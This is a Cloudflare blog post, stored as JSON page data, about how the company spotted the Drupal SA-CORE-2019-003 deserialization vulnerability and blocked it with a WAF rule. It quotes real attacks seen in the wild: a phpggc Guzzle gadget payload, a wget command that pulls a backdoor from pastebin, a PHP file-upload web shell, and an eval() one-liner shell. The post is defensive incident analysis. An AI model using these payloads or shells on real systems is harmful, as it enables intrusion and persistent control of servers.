{
	"locale": "en-us",
	"localesAvailable": [],
	"post": {
		"authors": [
			{
				"name": "Richard Sommerville",
				"slug": "richard-sommerville",
				"bio": null,
				"profile_image": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/1cB0CSs7pwBM4UWKkyh7JI/66562ee4790469cd2b19997f0f43f6e1/richard-sommerville.jpg",
				"location": null,
				"website": null,
				"twitter": null,
				"facebook": null
			}
		],
		"excerpt": "Drupal discovered a severe vulnerability and said they would release a patch. When the patch was released we analysed and created rules to mitigate these. By analysing the patch we created WAF rules to protect Cloudflare customers running Drupal.",
		"feature_image": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/6nNINh3XsTGMn2l5jdzrb7/a40cfd690867721f8f84210199a6114a/stopping-drupal-sa-core-2019-003.png",
		"featured": false,
		"html": "<p>On the 20th February 2019, Drupal <a href=\"https://www.drupal.org/psa-2019-02-19\">announced</a> that they had discovered a severe vulnerability and that they would be releasing a patch for it the next day. Drupal is a Content Management System used by many of our customers, which made it important that our WAF protect against the vulnerability as quickly as possible.</p><p>As soon as Drupal released their patch, we analysed it to establish what kind of payloads could be used against it and created rules to mitigate these. By analysing the patch we were able to put together WAF rules to protect cloudflare customers running Drupal.</p><p>We identified the type of vulnerability we were dealing within 15 minutes. From here, we were able to deploy rules to block the exploit well before any real attacks were seen.</p><h3>The exploit</h3><p>As Drupal&#39;s <a href=\"https://www.drupal.org/sa-core-2019-003\">release announcement</a> explains, a site is affected if:</p><ul><li><p>It has the Drupal 8 RESTful API enabled                                      </p></li><li><p>Or it uses <a href=\"https://www.drupal.org/sa-contrib-2019-020\">one</a> of the <a href=\"https://www.drupal.org/security/contrib\">8 modules</a> found to be affected</p></li></ul><p>From looking at the <a href=\"https://github.com/drupal/drupal/commit/9b3e441c2c6d98da402fcc8cab1e921ab8286936\">patch</a> we very quickly realised the exploit would be based on deserialization. The option <code>[&#39;allowed_classes&#39; =&gt; FALSE]</code> was added as part of the patch to the <a href=\"https://github.com/drupal/drupal/commit/9b3e441c2c6d98da402fcc8cab1e921ab8286936#diff-9077dc961778b7c8d9c47882c4248e42L67\">link</a> and <a href=\"https://github.com/drupal/drupal/commit/9b3e441c2c6d98da402fcc8cab1e921ab8286936#diff-d200adc66611cf78e65f2a3258144c49L194\">map</a> field types. This indicates that while these items are supposed to receive some serialized PHP, there was no legitimate case for supplying a serialized PHP object.</p><p>This is important because the easiest way to exploit a deserialization vulnerability in PHP is to supply a serialized Object that is crafted to execute code when deserialized.</p><p>Making the situation worse was the fact that the deserialization was performed regardless of any authentication.</p><p>We also realised that this meant blindly blocking all serialized PHP would break their intended functionality, as clearly these fields are supposed to receive specific kinds of serialized PHP, for example arrays or strings. Although as the PHP documentation <a href=\"https://secure.php.net/manual/en/function.unserialize.php\">notes</a>, it’s always a risky thing to deserialize untrusted data, even when restricting the set of data that’s excepted.</p><p>This blog <a href=\"https://www.ambionics.io/blog/drupal8-rce\">post from Ambionics</a> does a good job at explaining what a concrete exploitation of the vulnerability looks like, when applied to the Drupal 8 RESTful API.</p><h3>What we caught</h3><p>After the vulnerability was announced, we created several rules to experiment with different ways to build a signature to catch exploit attempts. Within an hour of the Drupal announcement we had deployed these in simulate mode, which logs potentially malicious requests without blocking them. After monitoring for false positives they were then improved them a few times as we tuned them.</p><p>This culminated in the deploy of rule D0020, which has blocked a number of attackers as shown in the graph below. The rule was already deployed in ‘drop’ mode by the time our first attack was observed at around 7pm UTC on Friday the 22nd of February 2019, and to date it has matched zero false positives. This is less than 48 hours from the announcement from Drupal.</p>\n            <figure class=\"kg-card kg-image-card \">\n            \n            <Image src=\"https://cf-assets.www.cloudflare.com/slt3lc6tev37/1UGyxkHL7SuJOy3M65Kf1u/e2f335754bcf641c64a6cd4f11a6180e/D0020.png\" alt=\"\" class=\"kg-image\" width=\"1712\" height=\"645\" loading=\"lazy\"/>\n            \n            </figure><p>Figure 1: Hits on rule D0020, with the first attack seen on the 22th February 2019.</p><p>These first attacks leveraged the “guzzle/rce1” gadget from phpggc to invoke the linux command “id” via PHP’s “system” function, exactly as <a href=\"https://www.ambionics.io/blog/drupal8-rce\">ambionics</a> did.</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">&#039;O:24:&quot;GuzzleHttp\\Psr7\\FnStream&quot;:2:{s:33:&quot;GuzzleHttp\\Psr7\\FnStreammethods&quot;;a:1:{s:5:&quot;close&quot;;a:2:{i:0;O:23:&quot;GuzzleHttp\\HandlerStack&quot;:3:{s:32:&quot;GuzzleHttp\\HandlerStackhandler&quot;;s:2:&quot;id&quot;;s:30:&quot;GuzzleHttp\\HandlerStackstack&quot;;a:1:{i:0;a:1:{i:0;s:6:&quot;system&quot;;}}s:31:&quot;GuzzleHttp\\HandlerStackcached&quot;;b:0;}i:1;s:7:&quot;resolve&quot;;}}s:9:&quot;_fn_close&quot;;a:2:{i:0;r:4;i:1;s:7:&quot;resolve&quot;;}}&#039;&#039;</pre></code>\n            <p>After this we saw several more attempts to use this gadget for executing various payloads, mostly to test whether targeted servers were vulnerable. Things like ‘phpinfo’, echoing strings and performing calculations.</p><p>The first malicious payload we saw used the same gadget, but this time to save a malicious payload from pastebin onto the user’s server.</p><p><code>wget -O 1x.php https://pastebin.com/raw/npLq4493</code></p><p>This script would have placed a backdoor on the target system by allowing them to upload files to the server via an HTML form. This would have given the attacker continued access to the system even if it was subsequently patched.</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">&lt;?  echo &quot;&#039;XXXXXXXXXXXX&quot;;\n$cwd = getcwd();\nEcho &#039;&lt;center&gt;  &lt;form method=&quot;post&quot; target=&quot;_self&quot; enctype=&quot;multipart/form-data&quot;&gt;  &lt;input type=&quot;file&quot; size=&quot;20&quot; name=&quot;uploads&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;upload&quot; /&gt;  &lt;/form&gt;  &lt;/center&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt;&lt;br&gt;&#039;;\nif (!empty ($_FILES[&#039;uploads&#039;])) {     move_uploaded_file($_FILES[&#039;uploads&#039;][&#039;tmp_name&#039;],$_FILES[&#039;uploads&#039;][&#039;name&#039;]);\n    Echo &quot;&lt;script&gt;alert(&#039;upload Done&#039;);\n\t\t&lt;/script&gt;&lt;b&gt;Uploaded !!!&lt;/b&gt;&lt;br&gt;name : &quot;.$_FILES[&#039;uploads&#039;][&#039;name&#039;].&quot;&lt;br&gt;size : &quot;.$_FILES[&#039;uploads&#039;][&#039;size&#039;].&quot;&lt;br&gt;type : &quot;.$_FILES[&#039;uploads&#039;][&#039;type&#039;];\n}\n?&gt;</pre></code>\n            <p>Another malicious payload seen was much more minimal:</p><p><code>echo &#39;&lt;?php @eval($_POST[&#39;pass&#39;]) ?&gt;&#39; &gt; vuln1.php</code></p><p>This payload creates a small PHP file on the server, which contains the dangerous eval() function. If this hadn’t been blocked, it would have allowed the attacker to issue commands via a single HTTP request to the vuln1.php file that could execute arbitrary commands directly on the potentially vulnerable system.</p><h3>Rates of exploitation</h3><p>The pattern we saw here is fairly typical of a newly announced vulnerability. Once a vulnerability is published, it doesn’t take long to see real attackers making use of the vulnerability - initially in small numbers with “test” payloads to identify whether the attacks work, but shortly afterwards in much higher numbers, and with more dangerous and subtle payloads. This vulnerability was weaponized within two days of disclosure, but that is by no means the shortest time frame we’ve seen.</p><p>It’s very hard to patch systems quickly enough to ensure that attackers don’t get through, so products like Cloudflare’s WAF are a vital line of defense against these emerging vulnerabilities.</p>",
		"id": "1bvpiflJ1cp5qLlzmhEyks",
		"localeList": {
			"name": "Stopping Drupal’s SA-CORE-2019-003 Vulnerability Config",
			"enUS": "English for Locale",
			"zhCN": "No Page for Locale",
			"zhHansCN": "No Page for Locale",
			"zhTW": "No Page for Locale",
			"frFR": "No Page for Locale",
			"deDE": "No Page for Locale",
			"itIT": "No Page for Locale",
			"jaJP": "No Page for Locale",
			"koKR": "No Page for Locale",
			"ptBR": "No Page for Locale",
			"esLA": "No Page for Locale",
			"esES": "No Page for Locale",
			"enAU": "No Page for Locale",
			"enCA": "No Page for Locale",
			"enIN": "No Page for Locale",
			"enGB": "No Page for Locale",
			"idID": "No Page for Locale",
			"ruRU": "No Page for Locale",
			"svSE": "No Page for Locale",
			"viVN": "No Page for Locale",
			"plPL": "No Page for Locale",
			"arAR": "No Page for Locale",
			"nlNL": "No Page for Locale",
			"thTH": "No Page for Locale",
			"trTR": "No Page for Locale",
			"heIL": "No Page for Locale",
			"lvLV": "No Page for Locale",
			"etEE": "No Page for Locale",
			"ltLT": "No Page for Locale"
		},
		"meta_description": null,
		"metadata": {
			"imgPreview": ""
		},
		"primary_author": {},
		"published_at": "2019-03-05T22:55:04.000+00:00",
		"reading_time": 3,
		"slug": "stopping-drupal-sa-core-2019-003",
		"tags": [
			{
				"id": "8nXW1ItPlgZj84101rl6g",
				"name": "Drupal",
				"slug": "drupal"
			},
			{
				"id": "lGCLqAT2SMojMzw5b6aio",
				"name": "WAF",
				"slug": "waf"
			},
			{
				"id": "7gPQ1MtyU85B0FNCOHq6ju",
				"name": "WAF Rules",
				"slug": "waf-rules"
			},
			{
				"id": "6Mp7ouACN2rT3YjL1xaXJx",
				"name": "Security",
				"slug": "security"
			},
			{
				"id": "2pFyOCtANFB5qS6nbtQbVp",
				"name": "Vulnerabilities",
				"slug": "vulnerabilities"
			}
		],
		"title": "Stopping Drupal’s SA-CORE-2019-003 Vulnerability",
		"updated_at": "2024-08-27T02:13:57.789Z",
		"url": "https://blog.cloudflare.com/stopping-drupal-sa-core-2019-003"
	},
	"translations": {
		"posts.by": "By",
		"footer.gdpr": "GDPR",
		"lang_blurb1": "This post is also available in {lang1}.",
		"lang_blurb2": "This post is also available in {lang1} and {lang2}.",
		"lang_blurb3": "This post is also available in {lang1}, {lang2} and {lang3}.",
		"footer.blurb": "Cloudflare's connectivity cloud protects <a target='_blank' href='https://www.cloudflare.com/network-services/' rel='noreferrer'>entire corporate networks</a>, helps customers build <a target='_blank' href='https://workers.cloudflare.com/' rel='noreferrer'>Internet-scale applications efficiently</a>, accelerates any <a target='_blank' href='https://www.cloudflare.com/performance/accelerate-internet-applications/' rel='noreferrer'>website or Internet application</a>, <a target='_blank' href='https://www.cloudflare.com/ddos/' rel='noreferrer'>wards off DDoS attacks</a>, keeps <a target='_blank' href='https://www.cloudflare.com/application-security/' rel='noreferrer'>hackers at bay</a>, and can help you on <a target='_blank' href='https://www.cloudflare.com/products/zero-trust/' rel='noreferrer'>your journey to Zero Trust</a>.<br/><br/>Visit <a target='_blank' href='https://one.one.one.one/' rel='noreferrer'>1.1.1.1</a> from any device to get started with our free app that makes your Internet faster and safer.<br/><br/>To learn more about our mission to help build a better Internet, <a target='_blank' href='https://www.cloudflare.com/learning/what-is-cloudflare/' rel='noreferrer'>start here</a>. If you&apos;re looking for a new career direction, check out <a target='_blank' href='http://www.cloudflare.com/careers' rel='noreferrer'>our open positions</a>.",
		"footer.press": "Press",
		"header.title": "The Cloudflare Blog",
		"footer.careers": "Careers",
		"footer.company": "Company",
		"footer.support": "Support",
		"footer.the_net": "theNet",
		"footer.our_team": "Our team",
		"footer.webinars": "Webinars",
		"page.more_posts": "More posts",
		"posts.time_read": "{time} min read",
		"footer.community": "Community",
		"footer.resources": "Resources",
		"footer.solutions": "Solutions",
		"footer.trademark": "Trademark",
		"header.subscribe": "Subscribe",
		"footer.compliance": "Compliance",
		"footer.free_plans": "Free plans",
		"footer.impact_ESG": "Impact/ESG",
		"posts.follow_on_X": "Follow on X",
		"footer.help_center": "Help center",
		"footer.network_map": "Network Map",
		"header.please_wait": "Please Wait",
		"page.related_posts": "Related posts",
		"footer.case_studies": "Case Studies",
		"footer.connect_2024": "Connect 2024",
		"footer.terms_of_use": "Terms of Use",
		"footer.white_papers": "White Papers",
		"footer.cloudflare_tv": "Cloudflare TV",
		"footer.community_hub": "Community Hub",
		"footer.compare_plans": "Compare plans",
		"footer.contact_sales": "Contact Sales",
		"header.contact_sales": "Contact Sales",
		"header.email_address": "Email Address",
		"page.error.not_found": "Page not found",
		"footer.developer_docs": "Developer docs",
		"footer.privacy_policy": "Privacy Policy",
		"footer.request_a_demo": "Request a demo",
		"page.continue_reading": "Continue reading",
		"footer.analysts_report": "Analyst reports",
		"footer.for_enterprises": "For enterprises",
		"footer.getting_started": "Getting Started",
		"footer.learning_center": "Learning Center",
		"footer.project_galileo": "Project Galileo",
		"pagination.newer_posts": "Newer Posts",
		"pagination.older_posts": "Older Posts",
		"posts.social_buttons.x": "Discuss on X",
		"footer.about_cloudflare": "About Cloudflare",
		"footer.athenian_project": "Athenian Project",
		"footer.become_a_partner": "Become a partner",
		"footer.cloudflare_radar": "Cloudflare Radar",
		"footer.network_services": "Network services",
		"footer.trust_and_safety": "Trust & Safety",
		"header.get_started_free": "Get Started Free",
		"page.search.placeholder": "Search Cloudflare",
		"footer.cloudflare_status": "Cloudflare Status",
		"footer.cookie_preference": "Cookie Preferences",
		"header.valid_email_error": "Must be valid email.",
		"footer.connectivity_cloud": "Connectivity cloud",
		"footer.developer_services": "Developer services",
		"footer.investor_relations": "Investor relations",
		"page.not_found.error_code": "Error Code: 404",
		"footer.logos_and_press_kit": "Logos & press kit",
		"footer.application_services": "Application services",
		"footer.get_a_recommendation": "Get a recommendation",
		"posts.social_buttons.reddit": "Discuss on Reddit",
		"footer.sse_and_sase_services": "SSE and SASE services",
		"page.not_found.outdated_link": "You may have used an outdated link, or you may have typed the address incorrectly.",
		"footer.report_security_issues": "Report Security Issues",
		"page.error.error_message_page": "Sorry, we can't find the page you are looking for.",
		"header.subscribe_notifications": "Subscribe to receive notifications of new posts:",
		"footer.cloudflare_for_campaigns": "Cloudflare for Campaigns",
		"header.subscription_confimation": "Subscription confirmed. Thank you for subscribing!",
		"posts.social_buttons.hackernews": "Discuss on Hacker News",
		"footer.diversity_equity_inclusion": "Diversity, equity & inclusion",
		"footer.critical_infrastructure_defense_project": "Critical Infrastructure Defense Project"
	}
}